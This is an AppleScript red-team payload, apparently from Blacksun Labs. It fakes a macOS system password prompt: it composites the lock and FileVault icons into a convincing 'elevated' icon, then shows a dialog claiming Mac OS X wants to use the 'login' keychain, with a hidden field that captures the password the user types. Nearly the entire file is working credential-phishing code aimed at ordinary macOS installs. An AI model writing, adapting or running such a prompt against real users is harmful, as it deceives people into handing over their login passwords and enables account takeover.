(*
 * display dialog with escalated icons.
 * 
 * Fuzzynop wanted a more realistic version of his display dialog payload. This
 * is the original payload I developed but found display dialog to be too 
 * limited and despite a realistic Lock+App icon that mimicked real system
 * prompts I wanted something truly realistic that would work on any freshly
 * installed host running OS X 10.5 - macOS 13. NSImage handling and compositing
 * is the big take away here.
 *
 * Coded by https://github.com/n0ncetonic
  Copyright © 2018 Blacksun Labs
   
   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
 *)

use framework "Cocoa"
use scripting additions

property NSImage : class "NSImage"
property NSGraphicsContext : class "NSGraphicsContext"

(*
 * Overlay icon onto lock icon
 * 
 * Incredibly simple to implement, this block of code makes icons 
 * at least 20% cooler and definitely a lot more believeable via
 * compositing. Currently hardcoded to use the illusive "Lock" icon
 * as a base. 
 *)
on createIconWithOverlay(overlayIcon)
	set mainIcon to NSImage's imageNamed:"NSSecurity"
	set overlayIcon to NSImage's imageNamed:overlayIcon
	set mSize to mainIcon's |size|() as record
	set mWidth to width of mSize
	mainIcon's lockFocus()
	tell NSGraphicsContext's currentContext
		its setImageInterpolation:3
	end tell
	overlayIcon's drawInRect:(current application's NSMakeRect(mWidth / 2, 0, mWidth / 2, mWidth / 2)) fromRect:(my NSZeroRect) operation:(my NSCompositeSourceOver) fraction:1.0
	mainIcon's unlockFocus()
	return mainIcon
end createIconWithOverlay

(*
 * What we are doing here is grabbing the File Vault icon
 * from within the CoreTypes system bundle and placing it
 * into the system's Icon cache, naming it 'VaultIcon'
 * for easy referencing later
 *)
set bundle to my (NSBundle's bundleWithPath:"/System/Library/CoreServices/CoreTypes.bundle")
set vaultIcon to bundle's imageForResource:"FileVaultIcon.icns"
vaultIcon's setName:"VaultIcon"

(*
 * Took FuzzyNop's original banger and made it minimal
 * like techno. Using our VaultIcon as input for the
 * createIconWithOverlay handler we get a nice icon
 * and show off the simplicity of elevating techniques
 * instead of emulating them
 *)

set uCantButIcon to createIconWithOverlay("VaultIcon")
uCantButIcon's setName:"Elevated"

display dialog "Mac OS X wants to use the \"login\" keychain" with icon "Elevated" default answer "" with hidden answer
